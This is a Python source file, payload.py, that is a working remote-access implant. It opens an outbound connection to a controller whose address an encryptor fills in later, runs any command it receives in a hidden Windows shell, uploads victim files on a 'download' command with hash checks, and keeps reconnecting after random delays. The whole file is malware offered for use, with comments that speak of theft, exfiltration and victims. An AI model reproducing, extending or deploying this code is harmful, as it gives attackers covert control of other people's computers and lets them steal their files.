# payload.py
# The Soul Reborn. It now understands the art of theft.

import os
import sys
import time
import random
import socket
import subprocess
import hashlib
import struct

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"  # This will be replaced by the encryptor
RPORT = ##RPORT##    # This will be replaced by the encryptor
BUFFER_SIZE = 4096
CHUNK_SIZE = 4096

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def send_file(s_obj, file_path):
    """Handles the reliable file sending logic."""
    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        s_obj.sendall(b"ERROR: File not found or is a directory.")
        return

    try:
        file_size = os.path.getsize(file_path)
        file_hash = calculate_sha256(file_path)
        
        # 1. Send header: [FILE_SIZE (8 bytes), FILE_HASH (64 bytes)]
        header = struct.pack('>Q', file_size) + file_hash.encode('utf-8')
        s_obj.sendall(header)
        
        # 2. Wait for ACK from the controller
        ack = s_obj.recv(3)
        if ack != b'ACK':
            # Controller rejected the transfer
            return

        # 3. Send file in chunks
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break # End of file
                s_obj.sendall(chunk)
        
        s_obj.sendall(b"DONE") # Signal end of transfer

    except Exception as e:
        try:
            s_obj.sendall(f"ERROR: {str(e)}".encode('utf-8'))
        except:
            pass # Connection might be dead

def run_conduit():
    """
    The main C2 loop. It connects, takes commands, and can exfiltrate files.
    """
    while True:
        s_obj = None # Ensure s_obj is defined
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # The soul is connected. Awaiting commands.
            while True:
                command_bytes = s_obj.recv(BUFFER_SIZE)
                if not command_bytes: break
                
                command = command_bytes.decode('utf-8', errors='ignore').strip()
                
                if command.lower().startswith("download "):
                    # --- The Exfiltration Ritual ---
                    parts = command.split(" ", 2)
                    if len(parts) == 2:
                        victim_path = parts[1]
                        send_file(s_obj, victim_path)
                    else:
                        s_obj.sendall(b"Usage: download <filepath>")

                elif command.lower() == "exit":
                    s_obj.close()
                    break

                else:
                    # --- The Standard Shell Ritual ---
                    CREATE_NO_WINDOW = 0x08000000
                    proc = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE,
                        creationflags=CREATE_NO_WINDOW
                    )
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    if not stdout_value:
                        s_obj.sendall(b"DONE (No output)")
                    else:
                        s_obj.sendall(stdout_value)

        except Exception:
            # If the connection fails or is broken, rest, then reconnect.
            if s_obj:
                s_obj.close()
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()